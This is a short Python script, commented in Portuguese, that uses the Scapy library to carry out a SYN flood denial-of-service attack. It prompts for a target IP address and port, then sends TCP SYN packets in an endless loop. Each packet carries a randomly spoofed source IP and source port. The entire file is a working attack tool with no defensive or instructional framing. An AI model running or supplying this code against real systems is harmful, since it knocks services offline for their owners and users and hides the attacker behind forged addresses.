from scapy.all import IP, TCP, send
import random
import sys

def syn_flood(alvo_ip, alvo_porta):
    print(f"A iniciar SYN Flood em {alvo_ip}:{alvo_porta}...")
    enviados = 0

    try:
        while True:
            # Gerar um IP de origem falso (IP Spoofing) para cada pacote
            # Nota: Em redes modernas, o ISP pode bloquear IPs que nao pertencem a sua rede
            ip_origem = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            
            # Gerar uma porta de origem aleatoria
            porta_origem = random.randint(1024, 65535)

            # Construir o pacote: Camada IP + Camada TCP com flag 'S' (SYN)
            pacote = IP(src=ip_origem, dst=alvo_ip) / \
                     TCP(sport=porta_origem, dport=alvo_porta, flags="S")

            # Enviar o pacote (verbose=0 para nao inundar o teu terminal)
            send(pacote, verbose=0)
            
            enviados += 1
            if enviados % 100 == 0:
                print(f"Pacotes SYN enviados: {enviados}")

    except KeyboardInterrupt:
        print("\nAtaque interrompido.")
        sys.exit()

if __name__ == "__main__":
    # Entrada de dados
    target = input("IP do Alvo: ")
    port = int(input("Porta do Alvo (ex: 80): "))
    
    syn_flood(target, port)
